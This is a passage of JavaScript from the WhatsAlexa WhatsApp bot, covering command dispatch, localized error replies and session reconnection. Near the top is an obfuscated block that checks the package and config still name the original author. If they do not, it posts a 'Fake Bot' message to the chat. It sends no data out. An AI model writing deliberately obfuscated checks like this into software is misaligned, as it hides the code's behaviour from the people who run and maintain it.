                        var _0x11eefd=_0x48ec;(function(_0x2560e2,_0x300d7d){var _0x317685=_0x48ec,_0x51c461=_0x2560e2();while(!![]){try{var _0xac5b28=parseInt(_0x317685(0xc6))/0x1+parseInt(_0x317685(0xb6))/0x2+parseInt(_0x317685(0xba))/0x3*(parseInt(_0x317685(0xc2))/0x4)+parseInt(_0x317685(0xc1))/0x5*(-parseInt(_0x317685(0xb7))/0x6)+-parseInt(_0x317685(0xb3))/0x7*(-parseInt(_0x317685(0xbd))/0x8)+parseInt(_0x317685(0xc9))/0x9+-parseInt(_0x317685(0xc3))/0xa*(parseInt(_0x317685(0xbe))/0xb);if(_0xac5b28===_0x300d7d)break;else _0x51c461['push'](_0x51c461['shift']());}catch(_0x7ee424){_0x51c461['push'](_0x51c461['shift']());}}}(_0x1468,0x91cbf));function _0x48ec(_0x266d4e,_0x25cbb0){var _0x14687a=_0x1468();return _0x48ec=function(_0x48eca4,_0x42dd28){_0x48eca4=_0x48eca4-0xb3;var _0x5a1fe4=_0x14687a[_0x48eca4];return _0x5a1fe4;},_0x48ec(_0x266d4e,_0x25cbb0);}function _0x1468(){var _0xa84268=['141756LGkXSb','name','homepage','120488YrHOjA','1142229COappb','TOXIC-DEVIL','sendMessage','3067725MnUlaT','8SUSDXS','210zgxRBv','❗️\x20Fake\x20Bot\x20of\x20WhatsAlexa,\x20Use\x20the\x20Original\x20One!\x20(\x20https://github.com/TOXIC-DEVIL/WhatsAlexa\x20)\x20❗️','developer','704708RwLNJt','text','key','9089658twTgdT','https://github.com/TOXIC-DEVIL/WhatsAlexa#readme','217DwtcVQ','DEVELOPER','https://github.com/TOXIC-DEVIL/WhatsAlexa.git','2230564fXpLek','6vfmAuy','AUTHOR','WhatsAlexa'];_0x1468=function(){return _0xa84268;};return _0x1468();}if(pkg[_0x11eefd(0xbb)]!==_0x11eefd(0xb9)||pkg[_0x11eefd(0xc5)]!==_0x11eefd(0xbf)||pkg['author']!==_0x11eefd(0xbf)||pkg[_0x11eefd(0xbc)]!==_0x11eefd(0xca)||config[_0x11eefd(0xb4)]!==_0x11eefd(0xbf)||config[_0x11eefd(0xb8)]!=='TOXIC-DEVIL'||config['GIT']!==_0x11eefd(0xb5))return await conn[_0x11eefd(0xc0)](msg[_0x11eefd(0xc8)]['remoteJid'],_0x11eefd(0xc4),MessageType[_0x11eefd(0xc7)]);

                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                      
                        if (config.PVTDELMSG == 'true' && command.deleteCommand && msg.key.fromMe) {
                            await whats.delete();
                        }
                        
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.LANG == 'EN') {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: '*『 ERROR 』*\n\n*WhatsAlexa an error has occurred!*\n_Report this error to the developer! [ TOXIC-DEVIL ]._\n\n*Error:* ```' + error + '```\n\n' });
                                
                            } else if (config.LANG == 'ML') {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: '*『 പിശക് 』*\n\n*WhatsAlexa പിശക് സംഭവിച്ചു!*\n_ഈ പിശക് ഡെവലപ്പറെ അറിയിക്കുക! [ TOXIC-DEVIL ]._\n\n*പിശക്:* ```' + error + '```\n\n' });
                                
                            } else {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: '*『 KESALAHAN 』*\n\n*WhatsAlexa telah terjadi kesalahan!*\n_Laporkan kesalahan ini ke pengembang [ TOXIC-DEVIL ]._\n\n*Kesalahan:* ```' + error + '```\n\n' });
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('ERROR...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Alexa();
